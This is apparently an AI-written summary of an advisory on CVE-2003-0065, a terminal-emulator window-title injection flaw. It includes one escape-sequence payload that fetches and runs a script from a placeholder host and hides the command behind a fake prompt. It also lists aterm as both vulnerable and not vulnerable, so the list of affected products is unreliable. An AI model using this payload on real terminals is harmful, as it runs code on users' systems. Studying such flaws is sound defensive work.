The provided content is a detailed analysis of vulnerabilities in terminal emulators, including those associated with CVE-2003-0065.

**CVE-2003-0065** specifically relates to the **Window Title Reporting vulnerability** in **uxterm**, as indicated in the "Vulnerability Index" section.

Here's a breakdown of the relevant information:

**Root Cause of Vulnerability:**
- The vulnerability stems from the ability of certain terminal emulators, including uxterm, to report the current window title by placing it directly on the command line when a specific escape sequence is received. This is a feature intended for user convenience, but its implementation leads to the vulnerability.

**Weaknesses/Vulnerabilities:**
- **Unsanitized Output:** The core issue is that the window title, which can be set by an attacker via escape sequences, is not sanitized before being placed on the command line.
- **Command Injection:** An attacker can embed arbitrary commands within the window title. When the user requests the window title to be reported and presses "enter," these commands will be executed.

**Impact of Exploitation:**
- **Arbitrary Command Execution:** An attacker can achieve arbitrary command execution on the user's system by embedding malicious commands within the window title and tricking the user into pressing "enter".
- **System Compromise:** Successful exploitation can lead to a full system compromise.

**Attack Vectors:**
- **Malicious Escape Sequences:** An attacker needs to be able to display arbitrary data to the victim's terminal emulator. This can be achieved through various means, such as:
    - Vulnerable logging systems (e.g., syslog daemons, Apache error logs)
    - Network tools with vulnerable responses (e.g., wget, curl, ftp, telnet)
    - Multi-user system messages
    - Email clients displaying saved attachments

**Required Attacker Capabilities/Position:**
- **Ability to Send Data to the Terminal:** The attacker must be able to send text data containing malicious escape sequences to the user's terminal.
- **Social Engineering:** The attacker often needs to employ social engineering techniques to encourage the user to press "enter" after the title is reported, thus executing the injected command.
- **No Direct Access Required:**  The attacker does not need direct access to the system, they can exploit the vulnerability remotely.

**Technical Details:**
- The escape sequence to report the window title is: `\e[21t`.
- The attacker injects commands by setting the window title to a malicious command string via escape sequences.
- The attacker can use techniques like setting the foreground/background colors to be identical or inserting a fake prompt before reporting the title to conceal the injected command.
- Example of a malicious sequence:
   ```
   echo -e "\e]2;;wget 127.0.0.1/.bd;sh .bd;exit;\a\e[21t\e]2;xterm\aPress Enter>\e[8m;"
   ```
  - This will set the window title to a malicious wget and shell command and when the user reports the title it will run the command and then hide it with the "invisible" attribute.

The document also notes that several terminal emulators were vulnerable to this issue including: xterm, dtterm, uxterm, rxvt, aterm, Eterm, hanterm, and putty.  While gnome-terminal, konsole, SecureCRT, and aterm were not vulnerable.
